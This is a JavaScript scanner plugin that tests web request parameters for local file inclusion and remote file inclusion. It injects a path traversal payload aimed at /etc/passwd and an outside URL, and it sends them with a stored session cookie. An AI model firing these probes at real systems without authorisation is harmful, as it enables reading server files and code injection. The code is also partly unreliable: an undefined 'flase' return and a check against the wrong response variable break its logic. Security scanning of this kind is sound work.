'use strict'
const RequestParser=require("../core/RequestParser.js")
const ResponseParser=require("../core/ResponseParser.js")
const { default: axios } = require("axios")

const {store_cookie} = require("../core/WebSpider.js")
// var response = await axios({
//     url:req.url,
//     method:req.request.request_line.method, 
//     data:req.data,
//     timeout:0,
//     headers:{
//       "Cookie":store_cookie[0]
//     },
// })
async function Check(req=new RequestParser("http://127.0.0.1")){
    var keyword=new URL(req.url).searchParams.toString()+req.request.data;
    if(keyword.includes("__DefaultValue__")===false&&keyword.match(/[a-zA-Z0-9]+=[a-zA-Z0-9]+\.[a-z]{1,4}/)===null)
        return [false]
    var playload="/../../../../../../../../../../../../../../../etc/passwd"
    var result=[]
    var url=req.url.replace(/=[a-zA-Z0-9]+\.[a-z]{1,4}/,"="+playload).replace("__DefaultValue__",playload)
    var data=req.request.data.replace(/=[a-zA-Z0-9]+\.[a-z]{1,4}/,"="+playload).replace("__DefaultValue__",playload)
    try{
       //文件包含 检测
       // 本地文件包含
       {
        let response=  await axios({
            url:url,
            method:req.request.request_line.method,
            data:data,
            timeout:0,
            headers:{
                "Cookie":store_cookie[0]
            },
        })
        if(response.headers["content-disposition"]!==undefined&&response.headers["content-disposition"].includes("attachment"))
            return [flase]

        if(response.data.includes("root:x:")){
            result.push([`文件参数以 ${playload} 代替，会读取本地文件`,""])
        }
       
       }
       //远程文件包含
       {
        playload="https://www.baidu.com/dfadfasdfasdf/"
        url=req.url.replace(/=[a-zA-Z0-9]+\.[a-z]{1,4}/,"="+playload).replace("__DefaultValue__",playload)
        data=req.request.data.replace(/=[a-zA-Z0-9]+\.[a-z]{1,4}/,"="+playload).replace("__DefaultValue__",playload)     
        let response1=  await axios({
            url:url,
            method:req.request.request_line.method,
            data:data,
            timeout:0,
            headers:{
                "Cookie":store_cookie[0]
            },
        })
        if(response.headers["content-disposition"]!==undefined&&response.headers["content-disposition"].includes("attachment"))
            return [flase]
     
        if(response1.data.match(/[]*404[^a-zA-Z0-9]/)!==null){
            result.push(["文件参数可以是远程URL，可以远程执行恶意代码",""])
        }
        
       
       }
      
     
    }catch(e){
        //console.log(e)
    }

   
    if(result.length!==0)
        return [true].concat(result)
    else
        return [false]
    // 对于数组中的元素，第一个是触发方法，第二个是修复意见，如果没有的话就用默认的代替,可以接多个数组

}

module.exports=Check






